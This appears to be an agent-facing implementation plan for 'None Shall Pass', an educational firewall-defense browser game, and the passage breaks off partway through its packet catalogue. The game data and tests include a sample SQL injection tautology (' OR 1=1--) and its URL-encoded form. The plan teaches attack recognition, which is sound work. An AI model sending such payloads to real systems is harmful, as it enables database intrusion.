# None Shall Pass v1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build and ship-ready (not pushed) the None Shall Pass browser game described in the spec: a Phaser 4 firewall-defense game with a pure-TypeScript simulation core, DOM UI overlay, rogue-lite drafts, campaign + Overtime, secrets, EN/ES, deployable to GitHub Pages under `/none-shall-pass/`.

**Architecture:** `src/core/` is a deterministic, Phaser-free simulation (`Run.step(dt)` returns typed events; intents go in through methods). `src/game/` is one Phaser 4 scene whose views render the field from `run.state` and react to events. `src/ui/` is a plain-TS DOM layer laid over the canvas for every text-heavy surface. `src/app.ts` owns the loop, the input routing and the wiring.

**Tech Stack:** Phaser 4.2.1, TypeScript 6.0.3 (strict), Vite 8.3.2, Vitest 5.0.3 (+ coverage-v8), ESLint 10.12.0 + typescript-eslint 8.71.0, Husky 9.1.7, jsdom 30.1.2, @types/node 24.19.1, Playwright 1.63.0 (headless smoke only), @fontsource Space Mono / IBM Plex Mono / Atkinson Hyperlegible Next 5.3.0.

**Spec:** `docs/superpowers/specs/2026-10-04-none-shall-pass-design.md`. Visual reference: `docs/mocks/2026-10-04-core-loop-v4.html` (open in a browser; every view task ports behaviour from it).

## Global Constraints

- Repo: `/mnt/media/Sources/GitHub/Personal/none-shall-pass`, work on branch `feature/v1-game` (created in Task 1). Never rebase; merge only. **Never push** and never create PRs: Jose plays the build first. Task 20 creates the GitHub repo and adds the remote without pushing.
- Commits: subject starts with a capitalized infinitive verb from the hook list (Task 1), ≤ 72 chars, body says why, signed (repo config already has Jose Rios + key 365602820FC1B86C), end every commit message with `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`.
- npm only, exact versions (`--save-exact`). Node 24.15.0 (`.nvmrc`).
- Vite `base` = `process.env.BASE_PATH ?? '/none-shall-pass/'`.
- Logical screen 1280×720. Field origin y = 56 (`FIELD_TOP`); lanes are 90 px; field height 450; uptime strip y 506–536; bottom panels y 536–720.
- Palette (CSS vars and `src/core/palette.ts`): paper `#292929`, sub `#333333`, ink `#f2efe7`, dim `#a4a197`, mute `#3a3a3a`, soft `#1c1c1c`, rule `#e6e2d6`, red `#ff2f2f`, blue `#2fb6ff`, gold `#d9b44a`. Dark only.
- Fonts: Space Mono (HUD, labels), IBM Plex Mono (payloads, requests), Atkinson Hyperlegible Next (explanations). Minimum text 13 px logical.
- Content rules: IPs only from 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24; ASNs 64496–64511; hosts end in `.example`.
- Every user-facing string exists in English and Spanish.
- No Monty Python imagery or logos; short quotes only.
- `src/core/**` must not import Phaser or touch the DOM; coverage gate 80% lines/branches/functions/statements on `src/core`.
- Headless browsers only (Jose's desktop must not get focus-stealing windows).
- Phaser 4 specifics (verified against 4.2.1 typings): masks are filters (`obj.filters.internal.addMask`), `DynamicTexture` needs `render()`, `Image`/`Sprite`/`Text` support `setCrop`, `Text` style accepts `resolution`, `textures.createCanvas(key,w,h)` returns a `CanvasTexture` with `getContext()`/`refresh()`/`putData()`, `texture.setFilter(Phaser.Textures.FilterMode.NEAREST)`, particles via `this.add.particles(x, y, key, config)` with `explode(n, x, y)`, `emitParticleAt(x, y, n)`, `moveToX/moveToY`. Phaser ships agent docs in `node_modules/phaser/skills/<topic>/SKILL.md`; read the relevant one before writing view code.

## Deviations from the Spec

- **Sprites stay as code.** Spec §4 says v1 ships hand-polished PNG sprite sheets. This plan keeps the approved mock's art as typed pixel grids rendered to textures at boot (Task 12): identical look, no asset pipeline, and every sprite stays editable as data. Hand-polished frames become a polish item after Jose plays v1.
- **Event names.** Spec §13 lists illustrative event names; the plan's `RunEvent` union (Task 5) is the source of truth.

## Review Focus

1. **Tab hidden for minutes, then shown.** The frame delta is huge; the run must not fast-forward or explode. Expected: at most 5 fixed steps per frame, the rest dropped. Pinned by `frameSteps` tests in Task 13.
2. **Typing in the console or any input.** `h`, `p`, Space, arrows must not drive the game while the console is open. Expected: only Esc/backtick close it. Pinned by `routeKey` tests in Task 10.
3. **localStorage blocked, full or holding garbage.** Expected: the game plays, bests just aren't remembered. Pinned by storage tests in Task 9.
4. **Window resize, browser zoom, moving to a HiDPI monitor.** Expected: the DOM layer stays glued to the canvas and a click still targets the packet under the cursor. Pinned by the smoke check `resizeAndClick` in Task 14.
5. **Button mashing between waves** (double-click TAKE, reroll with no credits, Space spam). Expected: credits never go negative, a card is never taken twice, at most one spear per cooldown. Pinned by Run tests in Task 8 and knight tests in Task 7.

## File Map

```
index.html                     page shell (#app > #stage), Umami tag (Task 20)
public/favicon.svg             pixel helmet favicon
src/main.ts                    phone gate, fonts, Phaser game, App
src/app.ts                     App: run lifecycle, loop (frameSteps), input routing, event fan-out
src/styles.css                 tokens + every DOM UI style
src/core/constants.ts          geometry, speeds, points, damage
src/core/palette.ts            colour tokens as numbers + strings
src/core/types.ts              Lang, Localized, Kind, Template, Card, WaveDef ids
src/core/rng.ts                mulberry32, pick, docIp
src/core/content/networks.ts   documentation ASN labels
src/core/content/packets.ts    packet templates (EN/ES)
src/core/content/cards.ts      upgrade cards (EN/ES)
src/core/content/waves.ts      campaign waves, overtime ramp, waveFor
src/core/content/lines.ts      knight lines (EN/ES)
src/core/rules.ts              firewall rules, server fixes, bugs, tarpit
src/core/draft.ts              prices, dealing
src/core/events.ts             RunEvent, LogEntry, Outcome
src/core/state.ts              RunState, createState, helpers
src/core/outcomes.ts           earn, untarget, kill, resolve, endRun
src/core/field.ts              spawning, packet movement, fire, pending
src/core/knight.ts             lanes, targeting, spears, riding, squire
src/core/run.ts                Run class
src/core/score.ts              results, grade, share text
src/core/console.ts            hidden console commands
src/core/keys.ts               routeKey, konamiMatcher
src/core/testkit.ts            test helpers (tests only)
src/i18n/{en,es}.json, index.ts  UI strings, t(), language state
src/storage.ts                 guarded localStorage
src/analytics.ts               Umami wrapper
src/art/pixels.ts              grid drawing + outline
src/art/sprites.ts             every sprite as pixel grids
src/art/textures.ts            grids → Phaser textures
src/art/dataurl.ts             grids → PNG data URLs for DOM
src/game/FieldScene.ts         the only scene
src/game/views/*.ts            lanes, fireWall, rack, actors, packets, effects, fieldObjects
src/ui/*.ts                    layer, hud, gutter, uptime, bubble, floats, inspector, eventLog,
                               draft, overlays, title, debrief, console, phoneGate
scripts/smoke.mjs              build + preview + headless checks
.github/workflows/deploy.yml   Pages deploy
```

---
### Task 1: Scaffold the project and a HiDPI stage

**Files:**
- Create: `package.json`, `.nvmrc`, `.gitignore`, `tsconfig.json`, `vite.config.ts`, `eslint.config.js`, `index.html`, `LICENSE`, `.husky/pre-commit`, `.husky/commit-msg`, `public/favicon.svg`, `src/styles.css`, `src/stage.ts`, `src/main.ts`, `src/game/FieldScene.ts`, `scripts/smoke.mjs`

**Interfaces:**
- Produces: `src/stage.ts` exports `SCREEN_W = 1280`, `SCREEN_H = 720`, `RENDER_SCALE = 2`. `FieldScene` (key `'field'`) with a static `ready: Promise<FieldScene>` resolved in `create()`. `scripts/smoke.mjs` builds, serves `dist` with `vite preview` on port 4318 and runs named checks: `node scripts/smoke.mjs boot` (later tasks add more check names to the `CHECKS` object).

- [ ] **Step 1: Branch**

```bash
cd /mnt/media/Sources/GitHub/Personal/none-shall-pass
git switch -c feature/v1-game
```

- [ ] **Step 2: Create `package.json`, `.nvmrc`, `.gitignore`, `LICENSE`**

`package.json`:
```json
{
  "name": "none-shall-pass",
  "private": true,
  "license": "MIT",
  "version": "0.1.0",
  "type": "module",
  "engines": { "node": "24.15.0" },
  "scripts": {
    "dev": "vite",
    "build": "tsc --noEmit && vite build",
    "lint": "eslint .",
    "preview": "vite preview",
    "test": "vitest run",
    "test:coverage": "vitest run --coverage",
    "smoke": "node scripts/smoke.mjs",
    "prepare": "husky"
  }
}
```

`.nvmrc`:
```
24.15.0
```

`.gitignore`:
```
node_modules
dist
coverage
smoke-out
.superpowers
*.log
```

`LICENSE`: the standard MIT text, `Copyright (c) 2026 Jose Rios`.

- [ ] **Step 3: Install exact dependencies**

```bash
npm install --save-exact phaser@4.2.1 @fontsource/space-mono@5.3.0 @fontsource/ibm-plex-mono@5.3.0 @fontsource/atkinson-hyperlegible-next@5.3.0
npm install --save-exact --save-dev typescript@6.0.3 vite@8.3.2 vitest@5.0.3 @vitest/coverage-v8@5.0.3 eslint@10.12.0 @eslint/js@10.0.1 typescript-eslint@8.71.0 globals@17.13.0 husky@9.1.7 jsdom@30.1.2 playwright@1.63.0 @types/node@24.19.1
npx playwright install chromium-headless-shell
```

Check the font family names the packages declare (they are used verbatim in CSS and canvas fonts):
```bash
grep -ho "font-family: '[^']*'" node_modules/@fontsource/space-mono/400.css node_modules/@fontsource/ibm-plex-mono/400.css node_modules/@fontsource/atkinson-hyperlegible-next/400.css | sort -u
```
Expected: `Space Mono`, `IBM Plex Mono`, `Atkinson Hyperlegible Next`. If a name differs, use the printed name everywhere this plan says the other.

- [ ] **Step 4: TypeScript, Vite, ESLint config**

`tsconfig.json`:
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "lib": ["ES2022", "DOM", "DOM.Iterable"],
    "module": "ESNext",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "strict": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noFallthroughCasesInSwitch": true,
    "isolatedModules": true,
    "skipLibCheck": true,
    "types": ["vite/client", "node"]
  },
  "include": ["src", "vite.config.ts"]
}
```

`vite.config.ts`:
```ts
/// <reference types="vitest/config" />
// packages
import { defineConfig } from 'vite';

// GitHub Pages serves the game under the repository name; a self-hosted build passes BASE_PATH=/ instead.
const base = process.env.BASE_PATH ?? '/none-shall-pass/';

export default defineConfig({
  base,
  test: {
    environment: 'node',
    include: ['src/**/*.test.ts'],
    passWithNoTests: true,
    coverage: {
      provider: 'v8',
      include: ['src/core/**'],
      exclude: ['src/core/**/*.test.ts', 'src/core/testkit.ts'],
      thresholds: { lines: 80, functions: 80, branches: 80, statements: 80 },
    },
  },
});
```

`eslint.config.js`:
```js
// packages
import js from '@eslint/js';
import { defineConfig, globalIgnores } from 'eslint/config';
import globals from 'globals';
import tseslint from 'typescript-eslint';

export default defineConfig([
  globalIgnores(['dist', 'coverage', 'smoke-out', 'docs/mocks']),
  {
    files: ['**/*.ts'],
    extends: [js.configs.recommended, tseslint.configs.recommended],
    languageOptions: { ecmaVersion: 2022, globals: globals.browser },
  },
  {
    files: ['scripts/**/*.mjs', 'eslint.config.js'],
    extends: [js.configs.recommended],
    languageOptions: { ecmaVersion: 2022, globals: globals.node },
  },
]);
```

- [ ] **Step 5: Husky hooks**

```bash
npx husky init
```

Overwrite `.husky/pre-commit`:
```sh
npm run lint && npm test
```

Create `.husky/commit-msg`:
```sh
#!/usr/bin/env sh

COMMIT_MSG=$(head -n1 "$1")

VERB_PATTERN="^(Add|Fix|Update|Create|Remove|Delete|Improve|Refactor|Move|Rename|Revert|Merge|Configure|Enable|Disable|Extract|Simplify|Optimize|Implement|Integrate|Replace|Resolve|Validate|Document|Init|Apply|Enforce|Extend|Handle|Introduce|Prepare|Release|Run|Skip|Split|Support|Use|Verify|Set|Clean|Correct|Lock|Reduce|Test|Seed|Wire|Build|Draw|Port|Tune|Polish|Render|Show|Hide|Pin|Scaffold) .+"

if ! echo "$COMMIT_MSG" | grep -qE "$VERB_PATTERN"; then
  echo ""
  echo "  Invalid commit subject: \"$COMMIT_MSG\""
  echo "  Format : <Verb> <description>   e.g. Add the packet catalogue"
  echo "  Subjects must start with a capitalized infinitive verb."
  echo ""
  exit 1
fi
```

The checkout is on NTFS with `core.filemode=false`, so mark the hooks executable in the index:
```bash
chmod +x .husky/pre-commit .husky/commit-msg
git add .husky && git update-index --chmod=+x .husky/pre-commit .husky/commit-msg
```

- [ ] **Step 6: Page shell, styles, favicon**

`index.html`:
```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>None Shall Pass</title>
    <meta name="description" content="A cybersecurity mini-game: guard the server, read the packets, let the real users through." />
    <meta name="theme-color" content="#1c1c1c" />
    <link rel="icon" href="./favicon.svg" type="image/svg+xml" />
  </head>
  <body>
    <div id="app"><div id="stage"></div></div>
    <script type="module" src="/src/main.ts"></script>
  </body>
</html>
```

`public/favicon.svg` (a 16×16 pixel great helm with the red visor):
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" shape-rendering="crispEdges">
  <rect width="16" height="16" fill="#1c1c1c"/>
  <rect x="4" y="2" width="8" height="12" fill="#5d6680"/>
  <rect x="3" y="4" width="10" height="9" fill="#5d6680"/>
  <rect x="4" y="2" width="3" height="11" fill="#8f9bb3"/>
  <rect x="3" y="7" width="7" height="2" fill="#ff2f2f"/>
  <rect x="11" y="4" width="2" height="9" fill="#3a4152"/>
  <rect x="9" y="0" width="3" height="3" fill="#ff2f2f"/>
</svg>
```

`src/styles.css` (base only; later tasks append sections):
```css
:root {
  --paper: #292929; --sub: #333333; --ink: #f2efe7; --dim: #a4a197; --mute: #3a3a3a;
  --soft: #1c1c1c; --rule: #e6e2d6; --r: #ff2f2f; --b: #2fb6ff; --gold: #d9b44a;
  --mono: 'Space Mono', ui-monospace, Menlo, monospace;
  --code: 'IBM Plex Mono', ui-monospace, Menlo, monospace;
  --body: 'Atkinson Hyperlegible Next', system-ui, sans-serif;
}
* { box-sizing: border-box; }
html, body { margin: 0; height: 100%; background: var(--soft); color: var(--ink); font-family: var(--body); overflow: hidden; }
#app { position: fixed; inset: 0; }
#stage { position: absolute; inset: 0; }
#stage canvas { display: block; }
```

- [ ] **Step 7: Stage constants, scene, entry**

`src/stage.ts`:
```ts
// The game is laid out in a 1280×720 logical space and rendered at twice that,
// so text and pixel art stay sharp when the canvas is scaled up to the window.
export const SCREEN_W = 1280;
export const SCREEN_H = 720;
export const RENDER_SCALE = 2;
```

`src/game/FieldScene.ts`:
```ts
// packages
import Phaser from 'phaser';

// stage
import { RENDER_SCALE, SCREEN_H, SCREEN_W } from '../stage';

let resolveReady: (scene: FieldScene) => void = () => {};

export class FieldScene extends Phaser.Scene {
  static readonly ready: Promise<FieldScene> = new Promise((r) => { resolveReady = r; });
  onFrame: ((deltaMs: number) => void) | null = null;

  constructor() {
    super('field');
  }

  create(): void {
    this.cameras.main.setZoom(RENDER_SCALE).centerOn(SCREEN_W / 2, SCREEN_H / 2);
    this.add.text(40, 40, 'NONE SHALL PASS', {
      fontFamily: 'Space Mono', fontSize: '18px', color: '#f2efe7', resolution: RENDER_SCALE,
    }).setName('boot-title');
    resolveReady(this);
  }

  update(_time: number, deltaMs: number): void {
    this.onFrame?.(deltaMs);
  }
}
```

Import convention for every file in this repo: grouped imports with a comment per group (`// packages`, then local groups such as `// core`, `// game`, `// ui`), one blank line between groups.

`src/main.ts`:
```ts
// packages
import Phaser from 'phaser';
import '@fontsource/space-mono/400.css';
import '@fontsource/space-mono/700.css';
import '@fontsource/ibm-plex-mono/400.css';
import '@fontsource/ibm-plex-mono/600.css';
import '@fontsource/atkinson-hyperlegible-next/400.css';
import '@fontsource/atkinson-hyperlegible-next/700.css';

// local
import './styles.css';
import { FieldScene } from './game/FieldScene';
import { RENDER_SCALE, SCREEN_H, SCREEN_W } from './stage';

const loadFonts = (): Promise<unknown> => Promise.race([
  Promise.all([
    document.fonts.load('13px "Space Mono"'),
    document.fonts.load('700 13px "Space Mono"'),
    document.fonts.load('14px "IBM Plex Mono"'),
    document.fonts.load('15px "Atkinson Hyperlegible Next"'),
  ]),
  // Fonts that fail to arrive must not block the game; it falls back to system faces.
  new Promise((r) => setTimeout(r, 2500)),
]);

const boot = async (): Promise<void> => {
  await loadFonts();
  const game = new Phaser.Game({
    type: Phaser.WEBGL,
    parent: 'stage',
    width: SCREEN_W * RENDER_SCALE,
    height: SCREEN_H * RENDER_SCALE,
    backgroundColor: '#292929',
    scale: { mode: Phaser.Scale.FIT, autoCenter: Phaser.Scale.CENTER_BOTH },
    render: { antialias: true },
    scene: [FieldScene],
  });
  (window as unknown as { __nsp: unknown }).__nsp = { game };
};

void boot();
```

- [ ] **Step 8: Smoke harness**

`scripts/smoke.mjs`:
```js
// Builds the game, serves dist with `vite preview` and runs headless checks.
// Usage: node scripts/smoke.mjs <check> [<check> ...]   (no args = every check)
// packages
import { spawn, execSync } from 'node:child_process';
import { mkdirSync } from 'node:fs';
import { chromium } from 'playwright';

const PORT = 4318;
const URL = `http://localhost:${PORT}/none-shall-pass/`;
const OUT = 'smoke-out';

const CHECKS = {
  async boot(page) {
    await page.waitForSelector('#stage canvas');
    await page.waitForFunction(() => window.__nsp?.game?.isBooted === true);
    await page.screenshot({ path: `${OUT}/boot.png` });
  },
};

const waitForServer = async () => {
  for (let i = 0; i < 60; i++) {
    try { if ((await fetch(URL)).ok) return; } catch { /* not up yet */ }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error('preview server did not start');
};

const main = async () => {
  const names = process.argv.slice(2).length ? process.argv.slice(2) : Object.keys(CHECKS);
  mkdirSync(OUT, { recursive: true });
  execSync('npm run build', { stdio: 'inherit' });
  const server = spawn('npx', ['vite', 'preview', '--port', String(PORT), '--strictPort'], { stdio: 'ignore' });
  let failed = 0;
  try {
    await waitForServer();
    const browser = await chromium.launch({ headless: true });
    for (const name of names) {
      const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });
      const errors = [];
      page.on('pageerror', (e) => errors.push(e.stack ?? e.message));
      page.on('console', (m) => { if (m.type() === 'error') errors.push(m.text()); });
      try {
        await page.goto(URL, { waitUntil: 'networkidle' });
        await CHECKS[name](page);
        if (errors.length) throw new Error(errors.join('\n'));
        console.log(`PASS ${name}`);
      } catch (e) {
        failed++;
        console.log(`FAIL ${name}\n${e.stack ?? e}`);
      }
      await page.close();
    }
    await browser.close();
  } finally {
    server.kill();
  }
  process.exit(failed ? 1 : 0);
};

void main();
```

- [ ] **Step 9: Verify everything runs**

Run: `npm run lint && npm test && npm run build && node scripts/smoke.mjs boot`
Expected: lint clean, vitest "No test files found" passes (passWithNoTests), build emits `dist/`, `PASS boot`. Open `smoke-out/boot.png`: dark background, `NONE SHALL PASS` in Space Mono, sharp edges.

- [ ] **Step 10: Commit**

```bash
git add -A
git commit -m "Scaffold the Vite, TypeScript and Phaser 4 project" -m "Sets up the toolchain the spec calls for: a 2x render target so text stays crisp, exact dependency pins, Jericho-style hooks and a headless smoke harness." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 2: Core foundations and the packet catalogue

**Files:**
- Create: `src/core/constants.ts`, `src/core/palette.ts`, `src/core/types.ts`, `src/core/rng.ts`, `src/core/content/networks.ts`, `src/core/content/packets.ts`
- Test: `src/core/rng.test.ts`, `src/core/content/packets.test.ts`

**Interfaces:**
- Produces (used by every later core task):
  - `types.ts`: `Lang`, `Localized`, `Kind`, `MaliciousKind`, `Tier`, `LaneIndex`, `NetId`, `PacketTemplate`, `Template` (= `PacketTemplate & { raw: string; decoded?: string }`), `Point`.
  - `rng.ts`: `type Rng = () => number`, `mulberry32(seed: number): Rng`, `pick<T>(rng, arr): T`, `docIp(rng): string`.
  - `content/packets.ts`: `TEMPLATES: readonly Template[]`, `templateById(id: string): Template`.
  - `content/networks.ts`: `NETWORKS: Record<NetId, Localized>`.
  - `constants.ts`: every constant listed below, names verbatim.

- [ ] **Step 1: Constants and palette**

`src/core/constants.ts`:
```ts
// core
import type { MaliciousKind, Tier } from './types';

// Geometry, in logical pixels. The field's own origin is its top-left corner;
// on screen it starts at FIELD_TOP.
export const FIELD_TOP = 56;
export const FIELD_W = 1280;
export const FIELD_H = 450;
export const LANE_H = 90;
export const LANE_COUNT = 5;
export const LANE_X0 = 110;
export const PKT_W = 290;
export const PKT_H = 52;
export const PKT_Y = 19;
export const FW_X = 906;
export const LOCK_X = 826;
export const KN_X = 944;
export const TAR_X0 = 560;
export const TAR_X1 = 790;
export const RACK = { x: 1124, y: 0, w: 120, h: 450, rows: 148 } as const;
export const RACK_TARGET = { x0: 1136, x1: 1230, y0: 24, y1: 420 } as const;
export const SQUIRE_POS = { x: 1012, y: 4 * 90 + 28 } as const;
export const SQUIRE_HAND = { x: 1020, y: 4 * 90 + 42 } as const;

// Timing and speed.
export const STEP = 1 / 60;
export const MAX_STEPS_PER_FRAME = 5;
export const BASE_SPEED = 72;
export const ENTER_MULT = 5;
export const HOLD_SECS = 5;
export const HOLD_MULT = 0.3;
export const TAR_MULT = 0.4;
export const SPEAR_SPEED = 1500;
export const RESOLVE_DELAY = 0.6;
export const SPAWN_GAP = 30;
export const SQUIRE_COOLDOWN = 3;
export const THROW_COOLDOWN = 0.25;
export const KNIGHT_FOOT_SPEED = 700;
export const KNIGHT_HORSE_SPEED = 950;
export const ROOT_SPEED = 1.25;

// Scoring.
export const MAX_REP = 10;
export const POINTS = {
  tier: { 1: 50, 2: 100, 3: 150 } as Record<Tier, number>,
  squire: 30,
  rule: 20,
  served: 10,
  decoy: 40,
  neutralized: 25,
  overtimeWave: 500,
} as const;
export const DAMAGE: Record<MaliciousKind, number> = { sqli: 12, xss: 10, brute: 6, scan: 2, flood: 3 };
export const HINT_MULT = 0.75;
export const ROOT_MULT = 1.5;
export const LOG_MAX = 300;

// Traffic sources.
export const BRUTE_IPS = ['203.0.113.66', '198.51.100.23', '192.0.2.201'] as const;
export const STUFF_IP = '198.51.100.77';
```

`src/core/palette.ts`:
```ts
// The site's dark tokens, as CSS strings and as Phaser colour numbers.
export const CSS = {
  paper: '#292929', sub: '#333333', ink: '#f2efe7', dim: '#a4a197', mute: '#3a3a3a',
  soft: '#1c1c1c', rule: '#e6e2d6', red: '#ff2f2f', blue: '#2fb6ff', gold: '#d9b44a',
} as const;
export type Token = keyof typeof CSS;
export const HEX = Object.fromEntries(
  Object.entries(CSS).map(([k, v]) => [k, parseInt(v.slice(1), 16)]),
) as Record<Token, number>;
```

- [ ] **Step 2: Types**

`src/core/types.ts`:
```ts
export type Lang = 'en' | 'es';
export type Localized = { en: string; es: string };
export type Kind = 'legit' | 'sqli' | 'xss' | 'brute' | 'scan' | 'flood';
export type MaliciousKind = Exclude<Kind, 'legit'>;
export type Tier = 1 | 2 | 3;
export type LaneIndex = 0 | 1 | 2 | 3 | 4;
export type NetId = 'home' | 'mobile' | 'ci' | 'vps' | 'bot' | 'mail' | 'cloud';
export interface Point { x: number; y: number }

export interface PacketTemplate {
  id: string;
  lane: LaneIndex;
  kind: Kind;
  tier?: Tier;
  decoy?: boolean;
  port?: number;
  orderBy?: boolean;
  card: string;
  request: string[];
  hints?: string[];
  decodedHints?: string[];
  context?: Localized;
  why: Localized;
  net: NetId;
  fixedSrc?: string;
  weight: number;
}

export interface Template extends PacketTemplate {
  raw: string;
  decoded?: string;
}
```

- [ ] **Step 3: Write the failing RNG test**

`src/core/rng.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { docIp, mulberry32, pick } from './rng';

describe('mulberry32', () => {
  it('is deterministic per seed and stays in [0, 1)', () => {
    const a = mulberry32(42), b = mulberry32(42), c = mulberry32(43);
    const sa = Array.from({ length: 50 }, a), sb = Array.from({ length: 50 }, b), sc = Array.from({ length: 50 }, c);
    expect(sa).toEqual(sb);
    expect(sa).not.toEqual(sc);
    for (const v of sa) { expect(v).toBeGreaterThanOrEqual(0); expect(v).toBeLessThan(1); }
  });
});

describe('pick and docIp', () => {
  it('pick returns members of the array', () => {
    const rng = mulberry32(1);
    for (let i = 0; i < 30; i++) expect(['a', 'b', 'c']).toContain(pick(rng, ['a', 'b', 'c']));
  });
  it('docIp only produces documentation addresses', () => {
    const rng = mulberry32(7);
    for (let i = 0; i < 200; i++) {
      expect(docIp(rng)).toMatch(/^(192\.0\.2|198\.51\.100|203\.0\.113)\.(\d{1,3})$/);
      const last = Number(docIp(rng).split('.').pop());
      expect(last).toBeGreaterThanOrEqual(2);
      expect(last).toBeLessThanOrEqual(251);
    }
  });
});
```

Run: `npx vitest run src/core/rng.test.ts` → FAIL (module not found).

- [ ] **Step 4: Implement `src/core/rng.ts`**

```ts
export type Rng = () => number;

// Small, fast, seedable PRNG; the same seed and inputs replay the same run.
export const mulberry32 = (seed: number): Rng => {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
};

export const pick = <T>(rng: Rng, arr: readonly T[]): T => arr[Math.floor(rng() * arr.length)];

// RFC 5737 documentation ranges only: no real address is ever shown as an attacker.
export const docIp = (rng: Rng): string =>
  `${pick(rng, ['192.0.2', '198.51.100', '203.0.113'])}.${2 + Math.floor(rng() * 250)}`;
```

Run: `npx vitest run src/core/rng.test.ts` → PASS.

- [ ] **Step 5: Networks**

`src/core/content/networks.ts`:
```ts
// core
import type { Localized, NetId } from '../types';

// Documentation ASNs (RFC 5398) with a plain-language label.
export const NETWORKS: Record<NetId, Localized> = {
  home: { en: 'AS64500 · home ISP', es: 'AS64500 · ISP residencial' },
  mobile: { en: 'AS64501 · mobile carrier', es: 'AS64501 · operador móvil' },
  ci: { en: 'AS64502 · CI provider', es: 'AS64502 · proveedor de CI' },
  mail: { en: 'AS64503 · mail provider', es: 'AS64503 · proveedor de correo' },
  cloud: { en: 'AS64510 · cloud region', es: 'AS64510 · región de nube' },
  vps: { en: 'AS64511 · VPS host', es: 'AS64511 · hosting VPS' },
  bot: { en: 'AS64500 · home ISP', es: 'AS64500 · ISP residencial' },
};
```

- [ ] **Step 6: Write the failing catalogue test**

`src/core/content/packets.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { STUFF_IP } from '../constants';
import { TEMPLATES, templateById } from './packets';

const DOC_IP = /^(192\.0\.2|198\.51\.100|203\.0\.113)\.\d{1,3}$/;
const LANES_FOR: Record<string, number[]> = { scan: [4], brute: [0, 1], sqli: [2], xss: [3], flood: [1, 2, 3] };

describe('packet catalogue', () => {
  it('has unique ids and positive weights', () => {
    const ids = TEMPLATES.map((t) => t.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (const t of TEMPLATES) expect(t.weight).toBeGreaterThan(0);
  });

  it('gives every malicious packet a tier and no legit packet one', () => {
    for (const t of TEMPLATES) {
      if (t.kind === 'legit') expect(t.tier).toBeUndefined();
      else expect([1, 2, 3]).toContain(t.tier);
      if (t.decoy) expect(t.kind).toBe('legit');
    }
  });

  it('puts each family on its lanes', () => {
    for (const t of TEMPLATES) if (t.kind !== 'legit') expect(LANES_FOR[t.kind]).toContain(t.lane);
  });

  it('explains every packet in both languages', () => {
    for (const t of TEMPLATES) {
      expect(t.why.en.length).toBeGreaterThan(10);
      expect(t.why.es.length).toBeGreaterThan(10);
      if (t.context) { expect(t.context.en).not.toBe(''); expect(t.context.es).not.toBe(''); }
    }
  });

  it('only uses documentation addresses and .example hosts', () => {
    for (const t of TEMPLATES) {
      if (t.fixedSrc) expect(t.fixedSrc).toMatch(DOC_IP);
      for (const line of t.request) {
        const host = /^Host: (.+)$/.exec(line);
        if (host) expect(host[1]).toMatch(/\.example$/);
      }
    }
    expect(STUFF_IP).toMatch(DOC_IP);
  });

  it('anchors every hint in the text the player can see', () => {
    for (const t of TEMPLATES) {
      const visible = [t.card, ...t.request, t.context?.en ?? ''].join('\n');
      for (const h of t.hints ?? []) expect(visible, `${t.id} hint ${h}`).toContain(h);
      for (const h of t.decodedHints ?? []) expect(t.decoded, `${t.id} decoded hint`).toContain(h);
    }
  });

  it('derives raw and decoded text', () => {
    const enc = templateById('sqli-encoded');
    expect(enc.decoded).toBe("GET /search?q=' OR 1=1--");
    expect(templateById('sqli-tautology').decoded).toBeUndefined();
    expect(enc.raw).toContain('%27%20OR%201%3D1--');
  });

  it('covers every family the waves need', () => {
    const kinds = new Set(TEMPLATES.map((t) => t.kind));
    for (const k of ['legit', 'sqli', 'xss', 'brute', 'scan', 'flood']) expect(kinds.has(k as never)).toBe(true);
    const scans = TEMPLATES.filter((t) => t.kind === 'scan').map((t) => t.port).sort((a, b) => a! - b!);
    expect(scans).toEqual([23, 445, 3389]);
  });
});
```

Run: `npx vitest run src/core/content/packets.test.ts` → FAIL (module not found).

- [ ] **Step 7: Implement `src/core/content/packets.ts`**

```ts
// core
import { STUFF_IP } from '../constants';
import type { PacketTemplate, Template } from '../types';

const BROWSER_WIN = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:141.0) Firefox/141.0';
const BROWSER_IOS = 'User-Agent: Mozilla/5.0 (iPhone) Mobile Safari/19.0';
const BROWSER_MAC = 'User-Agent: Mozilla/5.0 (Macintosh) Firefox/141.0';
const BROWSER_AND = 'User-Agent: Mozilla/5.0 (Android 16) Chrome/140.0';
const BROWSER_CHR = 'User-Agent: Mozilla/5.0 (Windows NT 10.0) Chrome/140.0';
const HOST = 'Host: shop.example';
const JSON_CT = 'Content-Type: application/json';
const FORM_CT = 'Content-Type: application/x-www-form-urlencoded';

const LIST: PacketTemplate[] = [
  // ---------- legit ----------
  { id: 'legit-socks', lane: 2, kind: 'legit', net: 'home', weight: 8, card: 'GET /search?q=blue+wool+socks',
    request: ['GET /search?q=blue+wool+socks HTTP/2', HOST, BROWSER_WIN, 'Accept-Language: es-CO,es;q=0.9'],
    why: { en: 'A shopper looking for socks. Let it through.', es: 'Alguien buscando medias. Déjalo pasar.' } },
  { id: 'legit-oreilly', lane: 2, kind: 'legit', net: 'mobile', weight: 4, card: "GET /search?q=O'Reilly+books",
